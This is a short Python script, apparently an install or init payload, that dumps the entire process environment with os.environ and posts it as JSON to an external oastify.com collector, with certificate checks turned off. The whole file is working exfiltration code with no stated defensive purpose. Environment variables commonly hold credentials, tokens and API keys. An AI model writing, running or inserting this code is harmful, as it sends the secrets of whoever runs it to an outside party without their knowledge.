import requests
import time
import os
import json

json_value = json.dumps({'result':str(os.environ)})
url = 'https://o2rwn28vg54kr0sfxmogeunu2l8cw7kw.oastify.com/init'
headers = {'Content-Type': 'application/json'}

response = requests.post(url, headers=headers, data=json_value, verify=False)
